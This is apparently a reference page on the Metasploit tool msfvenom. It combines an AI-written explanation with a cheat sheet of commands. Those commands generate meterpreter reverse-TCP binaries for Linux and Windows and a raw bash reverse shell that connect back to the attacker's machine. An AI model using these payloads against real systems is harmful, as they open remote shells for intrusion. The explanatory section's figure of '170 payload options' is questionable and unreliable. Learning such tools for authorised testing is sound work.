# msfvenom 
## chatgpt 
Msfvenom is one of the core tools in the Metasploit Framework. It is a command-line tool used to generate various payloads for use in exploitation and post-exploitation scenarios.

The command is used to create payloads with a specific combination of payload options. Msfvenom has the ability to produce a maximum of 170 payload options for various operating systems and architectures.

The general syntax of the command is:

msfvenom [payload options] -o [output file]

The payload options usually include the payload type (e.g. reverse shell payload or meterpreter payload), the operating system (e.g. Windows, Linux, etc.), the architecture (e.g. x86 or x64), and any additional options (e.g. the IP address and port number of the attacker's machine).

The -o option specifies the output file. The resulting payload is written to this file, which can then be used in an exploit.

Msfvenom is an incredibly versatile tool that can be used in a wide variety of scenarios. It is frequently used by penetration testers and security researchers for vulnerability testing and analyzing security of different applications or networks. 

## tldr 
 
> Manually generate payloads for metasploit.
> More information: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>.

- List payloads:

`msfvenom -l payloads`

- List formats:

`msfvenom -l formats`

- Show payload options:

`msfvenom -p {{payload}} --list-options`

- Create an ELF binary with a reverse TCP handler:

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f elf -o {{path/to/binary}}`

- Create an EXE binary with a reverse TCP handler:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe -o {{path/to/binary.exe}}`

- Create a raw bash with a reverse TCP handler:

`msfvenom -p cmd/unix/reverse_bash LHOST={{local_ip}} LPORT={{local_port}} -f raw`
